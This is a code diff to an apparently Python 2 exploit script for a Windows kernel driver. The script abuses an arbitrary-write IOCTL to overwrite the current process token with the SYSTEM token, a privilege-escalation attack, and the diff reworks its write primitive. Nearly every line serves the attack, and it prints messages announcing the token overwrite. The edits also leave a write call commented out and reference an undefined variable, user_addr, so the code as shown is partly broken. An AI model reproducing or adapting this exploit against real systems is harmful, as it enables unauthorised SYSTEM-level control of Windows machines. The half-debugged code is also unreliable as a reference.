@@ -177,7 +177,7 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
 ################################################### WRITE ###########################################################
 
-def writePrimitive(driver, what_addr, where):
+def writePrimitive(driver, what_addr, where, system_token):
 
     IoControlCode = 0x0022200B
     InputBuffer = c_void_p(1)
@@ -187,27 +187,32 @@ def writePrimitive(driver, what_addr, where):
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
+
+    what = cast(system_token, POINTER(c_ulonglong))[0]
+    everythingworked = cast(user_addr, POINTER(c_ulonglong))[0]
+          
+    print "Looks like everything worked, SYSTEM TOKEN value is: " + str(everythingworked)
     # Write the what value to int(what_addr)
 
-    #data = struct.pack('<Q', what_addr)
+    #data = struct.pack('<Q', what)
     #dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            #long(what_addr), data, len(data), byref(written))
+        #user_addr, data, len(data), byref(written))
 
     #if dwStatus == 0:
         #print ('Something went wrong while writing to memory', 'e')
         #sys.exit()
 
     data = struct.pack('<Q', long(what_addr)) + struct.pack('<Q', long(where))
-    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            1, data, len(data), byref(written))
+    print data
+    #dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
+            #1, data, len(data), byref(written))
 
-    if dwStatus == 0:
-        print ('Something went wrong while writing to memory in the packing section'
-               , 'e')
-        sys.exit()
+    #if dwStatus == 0:
+        #print ('Something went wrong while writing to memory in the packing section'
+               #, 'e')
+        #sys.exit()
 
-    print 'Value before DeviceIoControl: %08x' \
-        % cast(1, POINTER(c_ulonglong))[0]
+    print 'Value before DeviceIoControl: %08x' % cast(1, POINTER(c_ulonglong))[0]
 
     triggerIOCTL = kernel32.DeviceIoControl(
         driver,
@@ -373,7 +378,7 @@ def executeOverwrite():
 
         print "MAIN We know the proper offsets now."
         system_token = system_process_base_pointer + TOKEN_OFFSET
-        
+
         process_base_pointer = system_process_base_pointer
 
         counter = 0
@@ -398,7 +403,7 @@ def executeOverwrite():
             # Write the system_token over our current_token for SYSTEM privileges.
             print "MAIN Attempting system to current token overwrite!"
 
-            success = writePrimitive(driver, system_token, current_token)
+            success = writePrimitive(driver, system_token, current_token, system_token)
 
         print "MAIN Success!"
 ############################################ RUN ################################################
